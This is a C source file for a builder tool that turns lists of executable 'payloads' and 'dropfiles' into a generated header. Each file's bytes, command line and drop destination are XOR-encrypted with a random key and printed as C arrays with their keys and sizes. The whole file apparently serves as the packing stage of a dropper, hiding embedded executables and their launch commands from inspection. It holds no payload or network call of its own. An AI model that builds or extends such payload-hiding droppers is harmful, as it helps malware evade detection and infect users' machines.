#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

// First argument: txt file with payload list
// Second argument: txt file with dropfile list
// Writes all extracted data to stdout
int main(int argc, char *argv[]) {
	FILE *payloadList;	
	FILE *currentPayload;	
	char currentLine[256];
	char currentArrayName[32];
	unsigned char keys[32];
	char commandLines[32][256];
	int commandLineSizes[32];
	char *currentCommandLine;
	long payloadSizes[32];
	long currentPayloadSize;
	int payloadCounter;
	char payloadCounterAsString[16];
	int currentPayloadByte;
	time_t t;
			
	// Initialize RNG
	srand((unsigned) time(&t));		

	
	//-------------------
	// HANDLE PAYLOADS
	// Open payloads.txt
	payloadList = fopen(argv[1], "r");
	payloadCounter = 0;		
	
	// Extract payload paths line by line
	while(fgets(currentLine, sizeof(currentLine), payloadList)) {		
		// Generate current array name
		strcpy(currentArrayName, "payload");
		sprintf(payloadCounterAsString, "%d", payloadCounter);
		strcat(currentArrayName, payloadCounterAsString);
		printf("\nunsigned char %s[] = {", currentArrayName);
	
		// Fetch the command line
		// Search for last '\'
		if((currentCommandLine = strrchr(currentLine, '\\')) == NULL) {
			// or last '/'
			if((currentCommandLine = strrchr(currentLine, '/')) == NULL) {
				// If none found, assume current line = command line
				strcpy(commandLines[payloadCounter], currentLine);
			} else {
				strcpy(commandLines[payloadCounter], currentCommandLine + 1);
			}	
		} else {
			strcpy(commandLines[payloadCounter], currentCommandLine + 1);
		}
		
		//If command line contains newline at the end, remove it
		if(commandLines[payloadCounter][strlen(commandLines[payloadCounter]) - 1] == '\n') {
			commandLines[payloadCounter][strlen(commandLines[payloadCounter]) - 1] = 0;
		}		
		
		// Store command line size
		commandLineSizes[payloadCounter] = strlen(commandLines[payloadCounter]) + 1;		
	
		// Get executable path
		currentLine[strcspn(currentLine, " ")] = 0;		
		if(currentLine[strlen(currentLine)-1] == '\n') {
			currentLine[strlen(currentLine)-1] = 0;
		}	
		
		currentPayload = fopen(currentLine, "rb");		
		
		// Generate random key byte
		keys[payloadCounter] = rand() % 256;
		
		// Write relevant payload data into header file
		currentPayloadSize = 0;
		for (int i = 0;;i++) {
			if ((currentPayloadByte = fgetc(currentPayload)) == EOF) break;			
			if (i != 0) printf(",");
			if ((i % 12) == 0) printf("\n\t");
			// XOR the byte with the generated key before writing it into the array
			currentPayloadByte = currentPayloadByte ^ keys[payloadCounter];
			printf("0x%.2X", (unsigned char) currentPayloadByte);
			currentPayloadSize++;
		}
		
		printf("};");
		payloadSizes[payloadCounter] = currentPayloadSize;
				
		fclose(currentPayload);
		payloadCounter++;
	}		
	
	// Store all keys in an array in payloads.h
	printf("\nunsigned char keys[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		printf("0x%.2X", keys[i]);
	}
	printf("};\n");	
	
	// Store all payloadSizes in an array in payloads.h
	printf("\nlong payloadSizes[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		printf("%ld", payloadSizes[i]);
	}
	printf("};\n");
	
	// Store single command lines in separate arrays in payloads.h		
	for(int i=0; i < payloadCounter; i++) {
		// Generate current array name
		strcpy(currentArrayName, "commandLine");
		sprintf(payloadCounterAsString, "%d", i);
		strcat(currentArrayName, payloadCounterAsString);
		printf("\nunsigned char %s[] = {", currentArrayName);
		
		// Write command line data after XOR encryption with the respective key
		for(int j=0; j < commandLineSizes[i]; j++) {
			if(j != 0) printf(",");
			printf("0x%.2X", commandLines[i][j] ^ keys[i]);
		}	
		printf("};\n");		
	}
	
	// Store all command line sizes in an array in payloads.h
	printf("\nint commandLineSizes[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		printf("%d", commandLineSizes[i]);
	}
	printf("};\n");
	
	// Make all single command line arrays accessible in a known array "commandLines"
	printf("\n unsigned char* commandLines[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		strcpy(currentArrayName, "commandLine");
		sprintf(payloadCounterAsString, "%d", i);
		strcat(currentArrayName, payloadCounterAsString);
		printf("%s", currentArrayName);
	}
	printf("};");	
		
	
	printf("\nint payloadCount = %d;\n", payloadCounter);
	
	// Make all single payload arrays iterably accessible in a known array "payloads"
	printf("\n unsigned char* payloads[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		strcpy(currentArrayName, "payload");
		sprintf(payloadCounterAsString, "%d", i);
		strcat(currentArrayName, payloadCounterAsString);
		printf("%s", currentArrayName);
	}
	printf("};");
	
	fclose(payloadList);	
	
	
	//-------------------
	// HANDLE DROPFILES
	// Open dropfiles.txt
	payloadList = fopen(argv[2], "r");
	payloadCounter = 0;
	
	// Extract dropfile paths line by line
	while(fgets(currentLine, sizeof(currentLine), payloadList)) {
		// Generate current array name
		strcpy(currentArrayName, "dropfile");
		sprintf(payloadCounterAsString, "%d", payloadCounter);
		strcat(currentArrayName, payloadCounterAsString);
		printf("\nunsigned char %s[] = {", currentArrayName);
	
		// Fetch dropfile destination (= "command line")
		// Fetch the command line
		// Copy everything in current line after ';'
		strcpy(commandLines[payloadCounter], strrchr(currentLine, ';') + 1);		
		
		// If command line contains newline at the end, remove it
		if(commandLines[payloadCounter][strlen(commandLines[payloadCounter]) - 1] == '\n') {
			commandLines[payloadCounter][strlen(commandLines[payloadCounter]) - 1] = 0;
		}		
		
		// Store command line size
		commandLineSizes[payloadCounter] = strlen(commandLines[payloadCounter]) + 1;

		// Get dropfile (= "payload") path
		currentLine[strcspn(currentLine, ";")] = 0;		
		if(currentLine[strlen(currentLine)-1] == '\n') {
			currentLine[strlen(currentLine)-1] = 0;
		}	
		
		currentPayload = fopen(currentLine, "rb");		
		
		// Generate random key byte
		keys[payloadCounter] = rand() % 256;
		
		// Write relevant payload data into header file
		currentPayloadSize = 0;
		for (int i = 0;;i++) {
			if ((currentPayloadByte = fgetc(currentPayload)) == EOF) break;			
			if (i != 0) printf(",");
			if ((i % 12) == 0) printf("\n\t");
			// XOR the byte with the generated key before writing it into the array
			currentPayloadByte = currentPayloadByte ^ keys[payloadCounter];
			printf("0x%.2X", (unsigned char) currentPayloadByte);
			currentPayloadSize++;
		}
		
		printf("};");
		payloadSizes[payloadCounter] = currentPayloadSize;
				
		fclose(currentPayload);
		payloadCounter++;	
	}
	
	// Store all dropfile keys in an array in payloads.h
	printf("\nunsigned char dropfileKeys[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		printf("0x%.2X", keys[i]);
	}
	printf("};\n");	
	
	// Store all dropfileSizes in an array in payloads.h
	printf("\nlong dropfileSizes[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		printf("%ld", payloadSizes[i]);
	}
	printf("};\n");
	
	// Store single dropfile destinations in separate arrays in payloads.h		
	for(int i=0; i < payloadCounter; i++) {
		// Generate current array name
		strcpy(currentArrayName, "dropfileDestination");
		sprintf(payloadCounterAsString, "%d", i);
		strcat(currentArrayName, payloadCounterAsString);
		printf("\nunsigned char %s[] = {", currentArrayName);
		
		// Write dropfile destination data after XOR encryption with the respective key
		for(int j=0; j < commandLineSizes[i]; j++) {
			if(j != 0) printf(",");
			printf("0x%.2X", commandLines[i][j] ^ keys[i]);
		}	
		printf("};\n");		
	}
	
	// Store all dropfile destination sizes in an array in payloads.h
	printf("\nint dropfileDestinationSizes[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		printf("%d", commandLineSizes[i]);
	}
	printf("};\n");
	
	// Make all single dropfile destination arrays accessible in a known array "commandLines"
	printf("\n unsigned char* dropfileDestinations[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		strcpy(currentArrayName, "dropfileDestination");
		sprintf(payloadCounterAsString, "%d", i);
		strcat(currentArrayName, payloadCounterAsString);
		printf("%s", currentArrayName);
	}
	printf("};");	
			
	printf("\nint dropfileCount = %d;\n", payloadCounter);
	
	// Make all single dropfile arrays iterably accessible in a known array "dropfiles"
	printf("\n unsigned char* dropfiles[] = {");
	for(int i=0; i < payloadCounter; i++) {
		if(i != 0) printf(",");
		strcpy(currentArrayName, "dropfile");
		sprintf(payloadCounterAsString, "%d", i);
		strcat(currentArrayName, payloadCounterAsString);
		printf("%s", currentArrayName);
	}
	printf("};");	
	
	fclose(payloadList);
	
	return 0;
}
